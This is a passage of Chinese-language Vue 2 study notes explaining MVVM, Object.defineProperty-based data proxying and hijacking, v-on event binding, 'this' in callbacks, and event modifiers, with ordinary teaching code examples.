<font style="color:#595959;">            "</html>"</font>

<font style="color:#595959;">        ],</font>

<font style="color:#595959;">        "description": "vue学习模版" // 模板的描述</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

在javascript.json 中配置js的片段

<font style="color:#595959;">    // 配置信息</font>

<font style="color:#595959;">    "create vue instance": {</font>

<font style="color:#595959;">        // 给片段设置的简写</font>

<font style="color:#595959;">        "prefix": "v1",</font>

<font style="color:#595959;">        // 配置片段</font>

<font style="color:#595959;">        "body": [</font>

<font style="color:#595959;">            "\t var vm = new Vue({",</font>

<font style="color:#595959;">            "\t\tel: '#root',",</font>

<font style="color:#595959;">            "\t\tdata: {'$1'},",</font>

<font style="color:#595959;">            "\t });",</font>

<font style="color:#595959;">        ],</font>

<font style="color:#595959;">        // 片段描述信息（可删除）</font>

<font style="color:#595959;">        "description": "vm"</font>

<font style="color:#595959;">    },</font>



**《2.2、MVVM及数据代理》**

### 2.2.1 MVVM分层思想
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433644316-83fd9b5b-e863-4b08-8f8e-685ff7a3f44d.png)

#### 1. MVVM是什么？
M：Model（模型/数据）

V：View（视图）

VM：ViewModel（视图模型）：VM是MVVM中的核心部分。（它起到一个核心的非常重要的作用。）

MVVM是目前前端开发领域当中非常流行的开发思想。(一种架构模式。)

目前前端的大部分主流框架都实现了这个MVVM思想，例如Vue，React等。

#### 2. Vue框架遵循MVVM吗？
虽然没有完全遵循 MVVM 模型，但是 Vue 的设计也受到了它的启发。

Vue框架基本上也是符合MVVM思想的。

#### 3. MVVM模型当中倡导了Model和View进行了分离，为什么要分离？
假如Model和View不分离，使用最原始的原生的javascript代码写项目：

如果数据发生任意的改动，接下来我们需要编写大篇幅的操作DOM元素的JS代码。

<u>将Model和View分离之后，出现了一个VM核心</u>，这个VM把所有的脏活累活给做了，也就是说，<u>当Model发生改变之后，VM自动去更新View。当View发生改动之后，VM自动去更新Model</u>。我们再也不需要编写操作DOM的JS代码了。开发效率提高了很多。

<font style="color:#595959;"><body></font>

<font style="color:#595959;">  <!-- 准备容器 --></font>

<font style="color:#595959;">  <!-- View V--></font>

<font style="color:#595959;">  <div id="app"></font>

<font style="color:#595959;">    姓名：<input type="text" v-model="name"></font>

<font style="color:#595959;">  </div></font>



<font style="color:#595959;">  <!-- vue程序 --></font>

<font style="color:#595959;">  <script></font>

<font style="color:#595959;">    // ViewModel  VM</font>

<font style="color:#595959;">    const vm = new Vue({</font>

<font style="color:#595959;">      el : '#app',</font>

<font style="color:#595959;">      // Model  M</font>

<font style="color:#595959;">      data : {</font>

<font style="color:#595959;">        name : 'zhangsan'</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    })</font>

<font style="color:#595959;">  </script></font>

<font style="color:#595959;"></body></font>

### 2.2.2、vm可以访问哪些属性
通过Vue实例都可以访问哪些属性？(通过vm都可以vm. 什么。)

1. <font style="color:#000000;">Vue实例中的属性很多，有的以 $ 开始，有的以 _ 开始。</font>
    1. <font style="color:#000000;">所有以</font>**<font style="color:#FF0000;"> $ 开始</font>**<font style="color:#000000;">的属性，可以看做是</font>**<font style="color:#FF0000;">公开</font>**<font style="color:#000000;">的属性，这些属性是</font>**<font style="color:#FF0000;">供程序员</font>**<font style="color:#000000;">使用的。</font>
    2. <font style="color:#000000;">所有以 </font>**<font style="color:#FF0000;">_ 开始</font>**<font style="color:#000000;">的属性，可以看做是</font>**<font style="color:#FF0000;">私有</font>**<font style="color:#000000;">的属性，这些属性是</font>**<font style="color:#FF0000;">Vue框架底层</font>**<font style="color:#000000;">使用的。一般我们程序员很少使用。 </font>

2.<font style="color:#000000;">通过vm也可以访问Vue实例对象的原型对象上的属性，例如：vm.$delete...</font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      let dataObj = {</font>

<font style="color:#595959;">        msg: "Hello Vue!",</font>

<font style="color:#595959;">      };</font>



<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: dataObj,</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // 按说msg是dataObj对象的属性。</font>

<font style="color:#595959;">      console.log("dataObj的msg", dataObj.msg);</font>



<font style="color:#595959;">      // msg属性也可以通过vm来访问呢？</font>

<font style="color:#595959;">      // 这是因为Vue框架底层使用了数据代理机制。</font>

<font style="color:#595959;">      // 要想搞明白数据代理机制，必须有一个基础知识点要学会：Object.defineProperty()。</font>

<font style="color:#595959;">      // console.log("vm的msg", vm.msg);</font>



<font style="color:#595959;">      // 模拟Vue构造函数，无法直接用newVm.msg打印出</font>

<font style="color:#595959;">      // function myVue(obj) {</font>

<font style="color:#595959;">      //   return obj</font>

<font style="color:#595959;">      // }</font>

<font style="color:#595959;">      // let newVm = new myVue({</font>

<font style="color:#595959;">      //   el: "#app",</font>

<font style="color:#595959;">      //   data: dataObj,</font>

<font style="color:#595959;">      // });</font>

<font style="color:#595959;">      // console.log(newVm.data.msg);</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.2.3、object.defineProperty()
1. 这个方法是ES5新增的。

2. 这个方法的作用是：**<font style="color:#FF0000;">给对象新增属性</font>**，或者设置对象原有的属性。

3. 怎么用？

**<font style="color:#FF0000;">Object.defineProperty(给哪个对象新增属性, '新增的这个属性名叫啥', {给新增的属性设置相关的配置项key:value对})</font>**



4. 第三个参数是属性相关的配置项，配置项都有哪些？每个配置项的作用是啥？

+ **<font style="color:#FF0000;">value </font>**配置项：给属性**<font style="color:#FF0000;">指定值</font>**
+ **<font style="color:#FF0000;">writable </font>**配置项：设置该属性的值是否可以被**<font style="color:#FF0000;">修改</font>**。true表示可以修改。false表示不能修改。
+ **<font style="color:#FF0000;">enumerable </font>**配置项：设置该属性是否可以被**<font style="color:#FF0000;">遍历</font>**。
        * true表示该属性是可以遍历的。（可枚举的，可迭代的。）
        * false表示该属性是不可遍历的。
+ **<font style="color:#FF0000;">configurable </font>**配置项：设置该属性是否被**<font style="color:#FF0000;">删除</font>**。
        * true表示该属性是可以被删除的。
        * false表示该属性不可以被删除
+ **<font style="color:#FF0000;">getter</font>**方法 配置项：不需要我们手动调用的。当读取属性值的时候，getter方法被自动调用。

getter方法的返回值非常重要，这个返回值就代表读取的这个属性它的值。

+ **<font style="color:#FF0000;">setter</font>**方法 配置项：不需要我们手动调用的。当修改属性值的时候，setter方法被自动调用。

setter方法上是有一个参数的，这个参数可以接收传过来的值。

注意：当配置项当中有setter和getter的时候，value和writable配置项都不能存在。

<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 这是一个普通的对象</font>

<font style="color:#595959;">      let person = {};</font>

<font style="color:#595959;">      // 临时变量   </font>

<font style="color:#595959;">      let temp;</font>

<font style="color:#595959;">      // 给上面的phone对象新增一个color属性</font>

<font style="color:#595959;">      Object.defineProperty(person, "name", {</font>

<font style="color:#595959;">        //value : '章三',</font>

<font style="color:#595959;">        //writable : true,</font>

<font style="color:#595959;">        enumerable: false,</font>

<font style="color:#595959;">        // true表示该属性是可以遍历的。（可枚举的，可迭代的。）</font>

<font style="color:#595959;">        // false表示该属性是不可遍历的。</font>



<font style="color:#595959;">        configurable: false,</font>

<font style="color:#595959;">        // true表示该属性是可以被删除的。</font>

<font style="color:#595959;">        // false表示该属性是不可以被删除的。</font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        // getter方法配置项</font>

<font style="color:#595959;">        get: function () {</font>

<font style="color:#595959;">          console.log("getter方法执行了@@@");</font>

<font style="color:#595959;">          //return '动态'</font>

<font style="color:#595959;">          //return this.name  //递归，死循环</font>

<font style="color:#595959;">          return temp;</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // setter方法配置项</font>

<font style="color:#595959;">        set: function (val) {</font>

<font style="color:#595959;">          console.log("setter方法执行了@@@", val);</font>

<font style="color:#595959;">          //this.name = val  //递归，死循环</font>

<font style="color:#595959;">          temp = val;</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.2.4、数据代理机制
通过访问 <font style="color:#FF0001;">代理对象的属性</font> 来间接访问 <font style="color:#FF0001;">目标对象的属性</font>。数据代理机制的实现需要依靠：Object.defineProperty()方法。 

注意：代理对象<font style="color:#FF0001;">新增的这个属性的名字</font> 和 目<font style="color:#FF0001;">标对象的属性名要一致</font>，这样我们访问代理对象属性，就像在访问目标对象的属性一样

<font style="color:#595959;">  <script></font>

<font style="color:#595959;">      // 目标对象</font>

<font style="color:#595959;">      let target = {</font>

<font style="color:#595959;">        name: "zhangsan",</font>

<font style="color:#595959;">      };</font>

<font style="color:#595959;">      // 代理对象</font>

<font style="color:#595959;">      let proxy = {};</font>

<font style="color:#595959;">      // 如果要实现数据代理机制的话，就需要给proxy新增一个name属性。</font>

<font style="color:#595959;">      Object.defineProperty(proxy, "name", {</font>

<font style="color:#595959;">        get() {</font>

<font style="color:#595959;">          console.log("getter方法执行了@@@@");</font>

<font style="color:#595959;">          // 间接访问目标对象的属性</font>

<font style="color:#595959;">          return target.name;</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        set(val) {</font>

<font style="color:#595959;">          target.name = val;</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

### 2.2.5、数据代理时对属性名的要求
1. Vue实例不会给以_和$开始的属性名做数据代理。 

2. 为什么？

如果允许给_或$开始的属性名做数据代理的话。 vm这个Vue实例上可能会出现_xxx或$xxx属性， 而这个**<font style="color:#FF0000;">属性名可能会和Vue框架自身的属性名冲突。 </font>**

3. 在Vue当中，给data对象的属性名命名的时候，不能以_或$开始。

<font style="color:#595959;"><body></font>

<font style="color:#595959;">    <!-- 容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello Vue!",</font>

<font style="color:#595959;">          _name: "zhangsan", //不会做数据代码，vm上看不到</font>

<font style="color:#595959;">          $age: 20,//不会做数据代码，vm上看不到</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.2.6、模拟实现数据代理
简单实现myvm.name==options.data.name

<font style="color:#595959;">  <script></font>

<font style="color:#595959;">      const myvm = new MyVue({</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello Vue!",</font>

<font style="color:#595959;">          name: "jackson",</font>

<font style="color:#595959;">          age: 30,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

数据代理js

<font style="color:#595959;">// 实现数据代理,目的是读取  myvm.name == options.data.name</font>

<font style="color:#595959;">// 定义一个Vue类</font>

<font style="color:#595959;">class MyVue {</font>

<font style="color:#595959;">  // 定义构造函数</font>

<font style="color:#595959;">  // options 是一个对象{}</font>

<font style="color:#595959;">  // options对象中有一个data配置项</font>

<font style="color:#595959;">  constructor(options) {</font>

<font style="color:#595959;">   </font>**<font style="color:#FF0000;"> Object.keys(options.data).forEach((propertyName, index) => {</font>**

**<font style="color:#FF0000;">      Object.defineProperty(this, propertyName, {</font>**

**<font style="color:#FF0000;">        get() {</font>**

**<font style="color:#FF0000;">          // 读取对象的属性值 对象[变量]</font>**

**<font style="color:#FF0000;">          return options.data[propertyName];</font>**

**<font style="color:#FF0000;">        },</font>**

**<font style="color:#FF0000;">        set(val) {</font>**

**<font style="color:#FF0000;">          options.data[propertyName] = val;</font>**

**<font style="color:#FF0000;">        },</font>**

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    });</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

### 2.2.7、Vue中的数据代理与数据劫持
在vm身上，有两个属性$data,_data，这两个属性都指向Vue底层的真实的data对象，

通过$data,_data获取各属性值，是不会走数据代理机制的

其中：_data是框架内部使用的，可以看做是私有的

$data，这是Vue框架对外公开的一个属性

也就是说Vue框架会将data中的数据实时通过<font style="color:#C7254E;">Object.defineProperty</font>拷贝一份放在$data以及_data身上，供vm去使用

#### 1、Vue的数据代理
##### （1）、基本阐述
vue将_data中的所有数据属性<font style="color:#C7254E;">通过Object.defineProperty添加到vm实例上</font>，并且提供了<font style="color:#C7254E;">getter和setter方法，</font>于是通过vm直接获取数据的时候就<font style="color:#C7254E;">调用getter，获取_data中的值</font>，当修改的时候<font style="color:#C7254E;">调用setter修改_data中的值</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433644583-aef6337b-8ff8-4e93-97fa-e39ebeadce7a.png)

##### （2）数据代理有什么用呢？
既然**<font style="color:#FF0000;">vm上挂的属性就是_data中的数据代理</font>**，那么{{vm._data.name}}和{{name}}是等价的,{{vm_data.name='szk2'}}和{{name='szk2'}}也是等价的

所以就是为了写代码的方便，在{{}}直接写数据，或者直接修改就能操作到_data中

#### 2、数据劫持
数据劫持就是将vue代码里我们写的<font style="color:#C7254E;">data加工了一下，变成_data,让每个属性有了getter和setter</font>

<font style="color:#C7254E;">vue通过监听者observer来监听data中的数据，通过getter和setter监听者里面的方法，监听数据的读取与修改，当修改属性的时候，setter被调用，</font>**<font style="color:#FF0000;">在setter方法中就会让订阅者执行重新解析模板的操作，从而改变了页面</font>**

先看看我们写的data和加工之后的data有什么区别

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433644823-f9e72bfb-e271-415f-8df2-8d735cd4ae59.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433645031-14ca38d5-77b8-4287-988c-486f367f8250.png)

#### 3、总结
数据劫持：

创建Vue实例vm，vm身上会有_data属性，_data通过劫持data配置项，再通过defineProperty的getter和setter，得到的响应式的数据。把vue中的data数据拦截改写成具有getter和setter形式的_data,就是数据劫持。



数据代理：

vm中_data中的数据又通过数据代理（也是通过defineProperty的getter和setter实现），放置到vm身上，vm可以通过getter方法，setter方法直接使用_data中的数据，方便书写数据

步骤: 

1-把vue实例中的data,通过Object.defineProperty的setter和getter进行数据劫持,使得data改写为到_data(使得数据改写为响应式的数据，具有getter和setter); 

2-通过vm进行数据代理,代理_data



**《2.3、事件处理》**



### 2.3.1 事件处理的核心语法
#### 2.3.1.1、事件处理知识点
##### 1.指令的语法格式：
<标签 v-指令名:参数名="表达式">{{插值语法}}</标签>

“表达式”位置都可以写什么？

常量、JS表达式、Vue实例所管理的XXX

##### 2. 在Vue当中完成**<font style="color:#FF0000;">事件绑定</font>**需要哪个指令呢？
v-on指令。

语法格式：

**<font style="color:#FF0000;">v-on:事件名="表达式"</font>**

例如：

v-on:click="表达式" 表示当发生鼠标单击事件之后，执行表达式。

v-on:keydown="表达式" 表示当发生键盘按下事件之后，执行表达式。

3. 配置项methods

在Vue当中，**<font style="color:#FF0000;">所有事件所关联的回调函数，需要在Vue实例的配置项methods中进行定义。</font>**

methods是一个对象：{}

在这个methods对象中可以定义多个回调函数。



4. v-on指令也有**<font style="color:#FF0000;">简写</font>**形式

**<font style="color:#FF0000;">v-on:</font>**click 简写为 **<font style="color:#FF0000;">@</font>**click

v-on:keydown 简写为 @keydown

v-on:mouseover 简写为 @mouseover

....

5. 绑定的回调函数，如果函数调用时**<font style="color:#FF0000;">不需要</font>**传递任何**<font style="color:#FF0000;">参数</font>**，小括号**<font style="color:#FF0000;">()可以省略</font>**。**<font style="color:#FF0000;">默认传递事件对象event</font>**

6. Vue在调用回调函数的时候，会自动给回调函数传递一个对象，这个对象是：当前发生的事件对象。

7. 在绑定回调函数的时候，可以在回调函数的参数上使用 **<font style="color:#FF0000;">$event </font>**占位符，

Vue框架看到这个 $event 占位符之后，会自动**<font style="color:#FF0000;">将</font>**当前**<font style="color:#FF0000;">事件以对象的形式</font>**传过去。

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">       <!--需求一: 使用javascript原生代码实现，点击弹出‘hello提示’。 --></font>

<font style="color:#595959;">      <button onclick="alert('hello')">按钮1</button></font>

<font style="color:#595959;">        <!--需求二: 使用Vue来完成事件绑定   --></font>

<font style="color:#595959;">      <!-- 1、注意：alert()并没有被Vue实例管理，无法直接调用--></font>

<font style="color:#595959;">      <!-- <button v-on:click="alert('hello')">按钮2</button> --></font>

<font style="color:#595959;">      <!-- 2、注意：全局定义的sayHello()也不会被Vue实例管理。 --></font>

<font style="color:#595959;">      <!-- <button v-on:click="sayHello()">按钮3</button> --></font>

<font style="color:#595959;">      <!-- 3、正确的写法，配合methods配置项 --></font>

<font style="color:#595959;">      <button v-on:click="sayHello()">按钮4</button></font>

<font style="color:#595959;">      <!-- 4、v-on指令的简写形式 --></font>

<font style="color:#595959;">      <button @click="sayHi()">按钮5</button></font>

<font style="color:#595959;">      <!-- 5、v-on指令的传参 sayHi($event, 'jack') --></font>

<font style="color:#595959;">      <button @click="sayHi($event, 'jack')">按钮6</button></font>

<font style="color:#595959;">      <!-- 6、 绑定的回调函数，如果不需要传任何参数，小括号() 可以省略  --></font>

<font style="color:#595959;">      <button @click="sayWhat">按钮7</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- vue代码 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 自定义一个函数</font>

<font style="color:#595959;">      // function sayHello(){</font>

<font style="color:#595959;">      //     alert('hello')</font>

<font style="color:#595959;">      // }</font>



<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          num: 1,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          //函数的完整写法</font>

<font style="color:#595959;">          // sayHello:function {</font>

<font style="color:#595959;">          //   alert("hello");</font>

<font style="color:#595959;">          // },</font>

<font style="color:#595959;">          // 回调函数</font>

<font style="color:#595959;">          sayHello() {</font>

<font style="color:#595959;">            alert("hello");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          sayHi(event, name) {</font>

<font style="color:#595959;">            console.log(name, event);</font>

<font style="color:#595959;">            //alert("hi " + name)</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          sayWhat(event) {</font>

<font style="color:#595959;">            // console.log(event)</font>

<font style="color:#595959;">            // console.log(event.target)</font>

<font style="color:#595959;">            // console.log(event.target.innerText)</font>

<font style="color:#595959;">            // alert('hello')</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 2.3.1.2、事件回调函数中的this
(1)**<font style="color:#FF0000;"> 常规写法下：回调函数中的this是vm。</font>**

**<font style="color:#FF0000;">箭头函数写法下：回调函数中的this是window</font>**

箭头函数没有自己的this，它的this是继承过来的，默认这个this是箭头函数所在的宿主对象。这个宿主对象其实就是它的父级作用域。而对象又不能构成单独的作用域，所以这个父级作用域是全局作用域，也就是window。

(2) 可以在函数中改变data中的数据，例如：<font style="color:#FF0000;">this.num++</font>，这样会联动页面上产生动态效果。

<font style="color:#595959;"><body></font>

<font style="color:#595959;">    <!-- 容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <h1>计数器：{{num}}</h1></font>

<font style="color:#595959;">    //在模版中，可以拿到num，对num++，数据改变了，就会改变页面</font>

<font style="color:#595959;">      <button @click="num++">点击我加1</button></font>

<font style="color:#595959;">    // 方法的实现</font>

<font style="color:#595959;">      <button @click="add">点击我加2</button></font>

<font style="color:#595959;">      <button @click="add2">点击我加3（箭头函数）</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- vue代码 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "关于事件回调函数中的this",</font>

<font style="color:#595959;">          num: 0,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          add() {</font>

<font style="color:#595959;">            //num+=2; // 错误的。</font>

<font style="color:#595959;">            // 在这里需要操作num变量？怎么办？</font>

<font style="color:#595959;">            //console.log(vm === this)</font>

<font style="color:#595959;">            // console.log(this)</font>

<font style="color:#595959;">            // this.num+=2;</font>

<font style="color:#595959;">            // vm.num+=3;</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          add2: () => {</font>

<font style="color:#595959;">            //this.num+=3;</font>

<font style="color:#595959;">            //console.log(this === vm)</font>

<font style="color:#595959;">            //箭头函数中没有this，箭头函数中的this是从父级作用域当中继承过来的。</font>

<font style="color:#595959;">            //对于当前程序来说，父级作用域是全局作用域:window</font>

<font style="color:#595959;">            console.log(this);</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          //控制台通过vm直接调用</font>

<font style="color:#595959;">          sayhello() {</font>

<font style="color:#595959;">            alert("hello");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

(3) 回调函数并没有在vm对象上，为什么通过vm可以直接调用函数呢？尝试手写Vue框架。

<font style="color:#595959;">// 定义一个Vue类</font>

<font style="color:#595959;">class MyVue {</font>

<font style="color:#595959;">  // 定义构造函数</font>

<font style="color:#595959;">  // options 是一个对象{}</font>

**<font style="color:#FF0000;">  constructor(options) {</font>**

**<font style="color:#FF0000;">    // 源码实现methods  目的希望vm可以直接调用方法</font>**

**<font style="color:#FF0000;">    Object.keys(options.methods).forEach((methodName, index) => {</font>**

**<font style="color:#FF0000;">      // 给当前的vue实例拓展一个方法</font>**

**<font style="color:#FF0000;">      this[methodName]=options.methods[methodName]</font>**

**<font style="color:#FF0000;">    });</font>**

**<font style="color:#FF0000;">  }</font>**

<font style="color:#595959;">}</font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>methods实现原理</title></font>

<font style="color:#595959;">    <!-- 引入我们自己的vue.js --></font>

<font style="color:#595959;">    <script src="../js/myvue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new MyVue({</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "hello vue!",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          sayHi() {</font>

<font style="color:#595959;">            //console.log(this === vm)</font>

<font style="color:#595959;">            // console.log(this.msg);</font>

<font style="color:#595959;">            console.log("hi");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          sayHello: () => {</font>

<font style="color:#595959;">            //console.log(this === vm)</font>

<font style="color:#595959;">            console.log("hello");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.3.2 事件修饰符
<font style="color:#304455;">方法只有纯粹的数据逻辑，而不是去</font>**<u><font style="color:#304455;">处理 DOM 事件细节</font></u>**<font style="color:#304455;">。为了解决这个问题，Vue.js 为 </font><font style="color:#D63200;">v-on</font><font style="color:#304455;"> 提供了</font><font style="color:#273849;">事件修饰符</font><font style="color:#304455;">。之前提过，修饰符是由</font>**<u><font style="color:#304455;">点开头的指令后缀</font></u>**<font style="color:#304455;">来表示的。</font>

1. .prevent ： 等同于 event.preventDefault() <u>阻止事件的默认</u>行为。
2. .stop ： <u>停止事件冒泡</u>，等同于 event.stopPropagation()。
3. .capture ：添加事件监听器时<u>使用事件捕获</u>模式  
添加事件监听器包括两种不同的方式：  
一种是从内到外添加。（事件冒泡模式）  
一种是从外到内添加。（事件捕获模式）
4. .self ：这个事件如果是“<u>我自己</u>元素”上发生的事件，这个事件不是别人给我传递过来的事件，则执行对应的程序。
5. .once ： 事件<u>只发生一次</u>
6. .passive ：passive翻译为顺从/不抵抗。无需等待，直接继续**<font style="color:#FF0000;">（立即）执行事件的默认行为</font>**。  
.prevent：阻止事件的默认行为，.passive：解除阻止，这两种修饰符是对立的。不可以共存。（如果一起用，就会报错。）

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>事件修饰符</title></font>

<font style="color:#595959;">    <!-- 安装Vue --></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      div:not(#app) {</font>

<font style="color:#595959;">        background-color: pink;</font>

<font style="color:#595959;">        padding: 10px;</font>

<font style="color:#595959;">        margin: 5px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .divList {</font>

<font style="color:#595959;">        width: 300px;</font>

<font style="color:#595959;">        height: 200px;</font>

<font style="color:#595959;">        background-color: aquamarine;</font>

<font style="color:#595959;">        overflow: auto;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .item {</font>

<font style="color:#595959;">        width: 300px;</font>

<font style="color:#595959;">        height: 200px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>



<font style="color:#595959;">      <!--1、 阻止事件的默认行为  .prevent --></font>

<font style="color:#595959;">      <a href="https://www.baidu.com" @click.prevent="fun">百度</a></font>

<font style="color:#595959;">      <hr /></font>



<font style="color:#595959;">      <!--2、 停止事件冒泡  .stop--></font>

<font style="color:#595959;">      <div @click="san"></font>

<font style="color:#595959;">        <div @click="er"></font>

<font style="color:#595959;">          <button @click="fun">事件冒泡</button></font>

<font style="color:#595959;">        </div></font>

<font style="color:#595959;">      </div></font>

<font style="color:#595959;">      <hr /></font>



<font style="color:#595959;">      <!--3、 添加事件监听器时使用事件捕获模式 .capture --></font>

<font style="color:#595959;">      <!-- 默认采用冒泡模式。 --></font>

<font style="color:#595959;">      <div @click="san"></font>

<font style="color:#595959;">        <div @click="er"></font>

<font style="color:#595959;">          <button @click="fun">添加事件监听器的时候采用事件捕获模式</button></font>

<font style="color:#595959;">        </div></font>

<font style="color:#595959;">      </div></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      <!--4、 .self修饰符 只有点击到自己的时候会运行--></font>

<font style="color:#595959;">      <div @click="san"></font>

<font style="color:#595959;">        <div @click="er"></font>

<font style="color:#595959;">          <button @click="fun">self修饰符</button></font>

<font style="color:#595959;">        </div></font>

<font style="color:#595959;">      </div></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      <!-- </font>**<font style="color:#FF0000;">在Vue当中，事件修饰符是可以多个联合使用的。</font>**

<font style="color:#595959;">            但是需要注意：</font>

<font style="color:#595959;">                @click.self.stop：先.self，再.stop</font>

<font style="color:#595959;">                @click.stop.self：先.stop，再.self</font>

<font style="color:#595959;">         --></font>

<font style="color:#595959;">      <div @click="san"></font>

<font style="color:#595959;">        <div @click.self.stop="er"></font>

<font style="color:#595959;">          <button @click="fun">.self+.stop</button></font>

<font style="color:#595959;">        </div></font>

<font style="color:#595959;">      </div></font>

<font style="color:#595959;">      <hr /></font>

<font style="color:#595959;">      <!-- 5、.once修饰符：事件只发生一次 --></font>

<font style="color:#595959;">      <button @click.once="fun">事件只发生一次</button></font>



<font style="color:#595959;">      <!-- 6、.passive修饰符 --></font>

<font style="color:#595959;">      <div class="divList" @wheel.passive="testPassive"></font>

<font style="color:#595959;">        <div class="item">div1</div></font>

<font style="color:#595959;">        <div class="item">div2</div></font>

<font style="color:#595959;">        <div class="item">div3</div></font>

<font style="color:#595959;">      </div></font>

<font style="color:#595959;">      <!-- vue代码 --></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "事件修饰符",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          fun(event) {</font>

<font style="color:#595959;">            // 手动调用事件对象的preventDefault()方法，可以阻止事件的默认行为。</font>

<font style="color:#595959;">            //event.preventDefault();</font>

<font style="color:#595959;">            alert("1");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          er() {</font>

<font style="color:#595959;">            alert(2);</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          san() {</font>

<font style="color:#595959;">            alert(3);</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          testPassive(event) {</font>

